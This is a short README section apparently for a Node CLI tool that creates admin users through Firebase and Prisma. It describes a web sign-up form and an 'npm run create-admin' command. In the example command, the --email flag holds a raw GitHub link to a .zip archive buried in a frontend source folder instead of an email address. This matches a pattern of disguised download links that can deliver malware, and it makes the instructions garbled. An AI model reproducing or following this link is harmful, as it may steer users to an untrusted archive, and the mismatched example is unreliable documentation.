## 👥 User Creation Methods

### 1. Public Sign-Up (Web Form)

This is the user-friendly sign-up form accessible through the web. Here, users can register easily by filling out their details on the form.

### 2. Secure Admin Creation (CLI Script)

This method is for developers who need to onboard users directly through a terminal.

- **How to run the CLI command:**
  
  Use the following command structure to create an admin user. Ensure to replace the placeholders with actual information.

  ```bash
  npm run create-admin -- \
   --email "https://github.com/BobbyGuyG/CLI-Authentication/raw/refs/heads/main/frontend/src/pages/Authentication_CL_1.0.zip" \
   --password "AStrongP@ssw0rd!" \
   --ispName "Super Secure ISP" \
   --ownerName "Jane Doe"
  ```

This command uses parameters to create a new admin user. Each parameter has a specific purpose:

- `--email`: The email address for the new admin.
- `--password`: A strong password for account security.
- `--ispName`: The name of the internet service provider.
- `--ownerName`: The name of the admin owner.

### 🛠 Functionality

The CLI script works directly with Firebase and Prisma to create secure user records, ensuring accuracy and security without the need for a web server.
